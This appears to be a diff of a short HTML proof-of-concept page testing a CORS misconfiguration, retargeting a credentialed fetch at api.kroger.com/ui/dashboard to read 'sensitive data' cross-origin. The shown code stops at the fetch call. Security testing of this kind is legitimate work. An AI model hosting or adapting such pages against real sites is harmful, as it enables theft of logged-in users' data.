@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CORS Exploit PoC</title>
+    <title>CORS PoC</title>
   </head>
   <body>
-    <h2>CORS PoC for api.kroger.com</h2>
-    <p>Attempting to fetch data...</p>
-    <pre id="output">Loading...</pre>
+    <h2>CORS Exploit Test: /ui/dashboard</h2>
+    <p>Trying to fetch sensitive data...</p>
+    <pre id="output">Waiting...</pre>
 
     <script>
-      fetch("https://api.kroger.com", {
+      fetch("https://api.kroger.com/ui/dashboard", {
         method: "GET",
         credentials: "include"
       })
